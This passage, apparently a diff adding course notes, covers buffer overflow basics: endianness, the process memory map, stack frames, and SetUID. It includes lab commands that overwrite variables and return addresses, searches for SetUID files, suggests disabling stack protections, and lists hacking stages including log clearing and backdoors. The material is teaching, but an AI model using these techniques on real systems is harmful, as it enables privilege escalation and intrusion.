+// Storing value 10 (0x0000000A) in an int variable:
+dumpcode(&test, 4);
+// Result: 0xbffffb44  0a 00 00 00  ← Little Endian (low byte first)
+// Human reading order (Big Endian): 00 00 00 0a
+```
+
+**CPU Endianness**:
+- Little Endian: Intel x86/x64, AMD, ARM (general)
+- Big Endian: Motorola 68000, SPARC, Network standard (TCP/IP)
+- Byte order conversion functions: `htons()`, `htonl()` (host to network)
+
+### 11-10. Memory Value Modification Practice (Training Course)
+
+**String variable modification (DOG → CAT)**:
+```bash
+# buffer[20] is followed by target[4] = "DOG"
+# Fill 20 bytes then input CAT
+$ ./ex1 AAAAAAAAAAAAAAAAAAAAACAT
+# Result: AAAACAT → target = CAT
+```
+
+**Integer variable modification (1234 → 5678)**:
+```bash
+# Note: keyboard input is all treated as 'characters'
+# Characters '5678' = 0x35 0x36 0x37 0x38 → 943142453 (wrong answer)
+
+# Use perl to input numeric value directly (backtick approach)
+# Decimal 5678 = Hex 0x162E
+# Little Endian: \x2e\x16
+$ ./ex2 AAAAAAAAAAAAAAAAAAAA`perl -e 'print "\x2e\x16"'`
+# Result: [*] AFTER : the value of target is 5678
+
+# Hacker number 31337 = 0x7A69 → Little Endian: \x69\x7a
+$ ./ex2 AAAAAAAAAAAAAAAAAAAA`perl -e 'print "\x69\x7a"'`
+```
+
+**Return address modification**:
+```bash
+# Fill buffer[20] + SFP[4] = 24 bytes then input desired address
+# Modify return address to 0x12345678
+$ ./ex3 AAAAAAAAAAAAAAAAAAAAAAAA`perl -e 'print "\x78\x56\x34\x12"'`
+# → Segmentation fault (jumped to wrong address)
+
+# Modify to 0xdeadbeef (hackers' favorite "dead beef")
+$ ./ex3 AAAAAAAAAAAAAAAAAAAAAAAA`perl -e 'print "\xef\xbe\xad\xde"'`
+```
+
+**Key**: Input 4-byte hex in Little Endian reverse order. Segmentation fault confirms successful return address modification.
+
+### 11-11. Complete Memory Map (32-bit Process)
+
+**32-bit address range**: 0x00000000 ~ 0xFFFFFFFF (= 4GB)
+
+**Virtual Memory Structure**:
+```
+Low Address (0x00000000)
+┌─────────────────────┐
+│  Unmapped region     │  0x00000000 ~ ~0x08040000
+├─────────────────────┤
+│  Code (Text)         │  Machine code location (e.g., 0x080483c8)
+├─────────────────────┤
+│  Data region         │
+│  ├ Initialized data  │  Global/static vars (with initial values) (e.g., 0x08049478)
+│  └ Uninitialized BSS │  Global/static vars (no initial values) (e.g., 0x08049568)
+├─────────────────────┤
+│  Heap                │  malloc() dynamic allocation (e.g., 0x08049588) → grows up
+├─────────────────────┤
+│      Empty space     │  Fills as heap grows
+├─────────────────────┤
+│  Shared Libraries    │  libc.so.6, etc. (e.g., 0x4006604c)
+│                      │  → printf, scanf and all library functions
+├─────────────────────┤
+│      Empty space     │
+├─────────────────────┤
+│  Stack               │  Locals, return addresses, function args (e.g., 0xbffffb44)
+│                      │  ← Grows toward lower addresses
+├─────────────────────┤
+│  Kernel              │  0xc0000000 ~ 0xFFFFFFFF (1GB)
+└─────────────────────┘
+High Address (0xFFFFFFFF)
+```
+
+**User space 3GB + Kernel space 1GB** = 4GB total virtual memory
+
+**On kernel region access**: Segmentation fault (protected region)
+
+**Memory region order from low address**:
+Code → Initialized data → Uninitialized data (BSS) → Heap → (empty) → Shared libraries → (empty) → Stack → Kernel
+
+**Checking each region address**:
+```c
+// 1. Code region
+printf("0x%08x\n", &main);   // → 0x080483c8
+
+// 2. Initialized data
+int a = 10;  // Global variable (initialized)
+printf("&a = 0x%08x\n", &a); // → 0x08049478
+
+// 3. Uninitialized data
+int a;       // Global variable (uninitialized)
+printf("&a = 0x%08x\n", &a); // → 0x08049568
+
+// 4. Heap
+char *heap = (char *)malloc(100);
+printf("heap = 0x%08x\n", heap); // → 0x08049588
+
+// 5. Library (via dlopen/dlsym)
+// printf() is at 0x4006604c
+
+// 6. Stack (local variable)
+int a;
+printf("&a = 0x%08x\n", &a); // → 0xbffffb44
+```
+
+**Process**: A running program loaded into virtual memory. Each new process gets an independent 4GB virtual memory allocation.
+
+### 11-12. Stack Region Deep Dive
+
+**Stack characteristics (LIFO - Last In First Out)**:
+- Last data in is the first data out
+- PUSH: add data to stack (TOP address decreases)
+- POP: remove data from stack (TOP address increases)
+
+**TOP and BOTTOM**:
+- **TOP (Stack Pointer)**: lowest memory address among currently stacked data. Reference for add/remove. Decreases on PUSH, increases on POP.
+- **BOTTOM**: bottom of stack (highest address). Always corresponds to 0xc0000000 (kernel boundary).
+
+**Why stack grows from high to low addresses**:
+1. Never invades kernel region (high addresses)
+2. Heap grows low→high, so they face each other, efficiently using memory space
+
+**Three ways to draw the stack**:
+1. Vertical (intuitive growth direction, top is TOP)
+2. Vertical reverse (high address at top)
+3. Horizontal (aligned with memory map, left is low address = TOP)
+
+### 11-13. Actual Verification of Stack Values
+
+**1. Local variable stack storage order**:
+```c
+int a = 1, b = 2, c = 3, d = 4;
+dumpcode((unsigned char *)&d, 16);
+// → 0xbffffb38  [04 00 00 00] [03 00 00 00] [02 00 00 00] [01 00 00 00]
+// d(4) c(3) b(2) a(1) order from low → high address
+```
+
+**1-byte/2-byte variable stack storage**:
+- Stack default unit = 4 bytes
+- `char x = 7` (1 byte): remaining 3 bytes filled with **dummy (garbage) values**
+- `short x = 7` (2 bytes): 2 bytes dummy
+- Byte Ordering (Little Endian) only occurs for **2+ bytes**
+
+```
+// char x = 7; stack result:
+[03 00 00 00] [eb 83 04 07] [02 00 00 00]
+     c         dummy|x=07      b
+// short x = 7; stack result:
+[03 00 00 00] [eb 83 07 00] [02 00 00 00]
+     c         dummy|x=0007    b   (Byte Ordering occurs)
+```
+
+**2. Return address stack verification**:
+```c
+// Stack dump when func() is called
+// 0xbffffb28  [06 00 00 00] [05 00 00 00] [48 fb ff bf] [2f 86 04 08]
+//              func's b      func's a      SFP(Saved     RET(return addr)
+//                                         Frame Pointer)
+```
+
+**3. Function argument stack storage order**:
+- Function arguments are stored on stack in **reverse** declaration order
+- `func(arg1, arg2)` → arg2 is PUSHED first, then arg1
+
+```c
+// Stack when func(10, 20) is called:
+// [func's b] [func's a] [SFP] [RET] [arg1=0a] [arg2=14] [main's d..a]
+```
+
+**Stack Frame**:
+- Collection of local variables + SFP + return address + function arguments for one function
+- Every function has its own stack frame
+- LIFO function call order → perfectly matches stack data structure
+
+**Complete stack frame structure (low → high address)**:
+```
+[child function locals] [SFP] [RET] [child function arguments] [parent function locals]
+```
+
+### 11-14. Queue — Comparison with Stack
+
+| Characteristic | Stack | Queue |
+|---------------|-------|-------|
+| Processing | LIFO (Last In First Out) | FIFO (First In First Out) |
+| Analogy | Coin tube, coal pile | Two-ended pipe, waiting in line |
+| Use case | Function call/return | Keyboard input, printer spool |
+
+### 11-15. Local/Remote Buffer Overflow and 5 Stages of Hacking
+
+**5 Stages of Hacking**:
+
+1. **Information Gathering**: Identify domain, IP, OS, running services. Search for vulnerabilities.
+2. **Remote Attack**: Gain server access without an account.
+   - Social engineering (password guessing)
+   - Web hacking (SQL Injection, XSS, file upload)
+   - System hacking (BOF, Format String, etc.)
+   - → BOF used here = **Remote Buffer Overflow**
+3. **Local Attack**: Escalate from regular user to root privileges.
+   - SetUID bit file vulnerabilities, local service vulnerabilities, kernel vulnerabilities
+   - → BOF used here = **Local Buffer Overflow**
+4. **Clearing Traces**: Delete access logs (log files record client IP and received data)
+5. **Installing Backdoor**: Secret passage for re-entry
+
+### 11-16. SetUID Bit Detail
+
+**Concept**: An attribute set on executable files. Files with this attribute **operate with the file owner's permissions during execution**.
+
+**Why it's needed**: When regular users change their password, they need to access `/etc/passwd` and `/etc/shadow`, so `/bin/passwd` temporarily needs root permissions only during execution.
+
+```bash
+# Check SetUID
+$ ls -al /usr/bin/passwd
+-r-s--x--x    1 root     root        12244 Feb  8  2000 /usr/bin/passwd
+#   ↑ 's' attribute = SetUID bit set (runs with owner root's permissions)
+
+# Find SetUID files
+$ find / -perm -4000 2>/dev/null        # Search SetUID files (suppress errors)
+$ find / -perm -4000                    # Search SetUID files (with errors)
+$ find / -perm -g+s 2>/dev/null        # Search SetGID files
+
+# Set/unset SetUID
+$ chmod u+s filename   # Set SetUID
+$ chmod u-s filename   # Unset SetUID
+$ chmod g+s filename   # Set SetGID
+$ chmod g-s filename   # Unset SetGID
+$ chmod ug+s filename  # Set both SetUID + SetGID
+```
+
+**SetUID + BOF combination = privilege escalation attack**:
+- Normal SetUID: owner permissions only during program execution, limited functionality
+- If SetUID file has BOF vulnerability: change execution flow to escape restrictions and execute arbitrary commands with root privileges
+
+**Related permission concepts**:
+- `euid` (effective UID): actual permissions held during file execution
+- `chown root:root file`: change file owner and group to root
+- `2>/dev/null`: discard standard error output to `/dev/null` (hide error messages)
+
+---
+
+## 12. Key Q&A Summary (BOF Fundamentals)
+
+### Main Concept Answers
+
+| Question | Answer |
+|----------|--------|
+| What is a Buffer? | Temporary storage space for data received from keyboard, etc. |
+| What is Buffer Overflow? | When data input exceeds buffer size, the buffer overflows and invades adjacent memory |
+| What is gets() function? | Standard input function that receives strings without checking string length |
+| Role of Return Address? | Stores address for returning to previous function. Prevents infinite loops. |
+| Meaning of stack LIFO? | Last In First Out |
+| Meaning of queue FIFO? | First In First Out |
+| What is Segmentation fault? | Return address modified to wrong value, unable to find correct memory segment |
+| What is virtual memory? | 4GB virtual memory logically structured in 32-bit systems, mapped to physical memory |
+| What is Swapping? | Temporarily saving unused memory pages to hard disk to free physical memory |
+| What is a Stack Frame? | Stack bundle of one function unit: locals + SFP + return address + function arguments |
+| What is ESP? | Extended Stack Pointer Register — register pointing to current stack TOP position |
+| ASLR acronym? | Address Space Layout Randomization |
+| DEP acronym? | Data Execution Prevention |
+| What is euid? | Effective UID — actual effective permissions held during file execution |
+
+### Little Endian Conversion Examples
+
+| Original Value | Little Endian (memory storage) |
+|---------------|-------------------------------|
+| 0xDEADBEEF | `\xef\xbe\xad\xde` |
+| 0x12345678 | `\x78\x56\x34\x12` |
+| 5678 (0x162E) | `\x2e\x16` |
+| 31337 (0x7A69) | `\x69\x7a` |
+
+### Practice Commands Summary
+
+Compilation and debugging commands for buffer overflow practice. Use -fno-stack-protector and -z execstack options to disable protections.
+
+```bash
+# Compile program
+gcc -o test test.c
+
+# Pass arguments
+./test abc def
+
+# Pass numeric values with perl (backtick + -e option)
+./program `perl -e 'print "\x78\x56\x34\x12"'`
+
+# Pass numeric values with python (-c option)
+./program `python -c 'print "\x78\x56\x34\x12"'`
+
+# Check own permissions
+id
+whoami
+
+# Find SetUID files (suppress errors)
+find / -perm -4000 2>/dev/null
+
+# Create symbolic link
+ln -s test test1
+
+# View hex dump
+xxd filename
+
+# View library function list
 /usr/bin/nm /lib/libc.so.6 | more
 ```
